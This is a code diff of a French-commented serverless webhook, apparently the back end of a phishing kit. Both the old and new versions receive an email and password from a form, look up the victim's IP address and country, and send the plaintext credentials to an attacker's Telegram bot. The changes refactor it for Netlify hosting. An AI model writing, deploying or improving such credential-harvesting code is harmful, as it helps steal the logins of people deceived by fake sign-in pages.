@@ -1,70 +1,58 @@
-// pages/api/webhook.js
 export default async function handler(req, res) {
-  res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
-  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
-
-  if (req.method === "OPTIONS") {
-    return res.status(200).end();
-  }
-
   if (req.method !== "POST") {
     return res.status(405).json({ error: "Méthode non autorisée" });
   }
 
   try {
-    const { email, motDePasse } = req.body || {};
+    const { email, password } = req.body;
 
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.CHAT_ID;
-
-    if (!botToken || !chatId) {
-      console.error("Variables d'environnement manquantes");
-      return res.status(500).json({ error: "Configuration serveur incomplète" });
+    if (!email || !password) {
+      return res.status(400).json({ error: "Email et mot de passe requis" });
     }
 
-    // --- 1. Obtenir l'IP du client
+    // ✅ Récupération IP (Netlify fournit x-nf-client-connection-ip)
     const ip =
-      req.headers["x-forwarded-for"]?.split(",")[0] ||
-      req.socket?.remoteAddress ||
+      req.headers["x-nf-client-connection-ip"] ||
+      req.headers["x-forwarded-for"] ||
       "IP inconnue";
 
-    // --- 2. Appeler une API pour obtenir le pays
-    let country = "Inconnu";
+    // ✅ Localisation (pays)
+    let country = "";
     try {
-      const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
-      const geoData = await geoRes.json();
-      if (geoData && geoData.country) {
-        country = geoData.country;
+      const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+      if (geoResponse.ok) {
+        const geoData = await geoResponse.json();
+        country = geoData.country_name ? ` (${geoData.country_name})` : "";
       }
     } catch (e) {
-      console.warn("Impossible d'obtenir le pays via IP");
+      console.warn("Impossible de récupérer la localisation:", e);
     }
 
-    // --- 3. Créer le message formaté
+    // ✅ Variables d'environnement (configurées dans Netlify)
+    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
     const message = `Nouvelle soumission :
-🌍 IP : ${ip} (${country})
+🌍 IP : ${ip}${country}
 📧 Email : ${email}
-🔑 Mot de passe : ${motDePasse}`;
+🔑 Mot de passe : ${password}`;
 
-    // --- 4. Envoyer le message à Telegram
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    const telegramResponse = await fetch(telegramUrl, {
+    const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: message }),
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
     });
 
-    if (!telegramResponse.ok) {
-      const text = await telegramResponse.text();
-      console.error("Telegram returned error:", text);
-      return res.status(500).json({ error: "Erreur lors de l'envoi à Telegram", details: text });
+    if (!response.ok) {
+      throw new Error(`Erreur Telegram API: ${response.status}`);
     }
 
-    return res.status(200).json({ success: true, message: "Données envoyées à Telegram" });
+    return res.status(200).json({ success: true });
+
   } catch (error) {
-    console.error("Erreur serveur:", error);
-    return res.status(500).json({ error: "Erreur serveur" });
+    console.error("Erreur webhook:", error);
+    return res.status(500).json({ error: error.message });
   }
 }
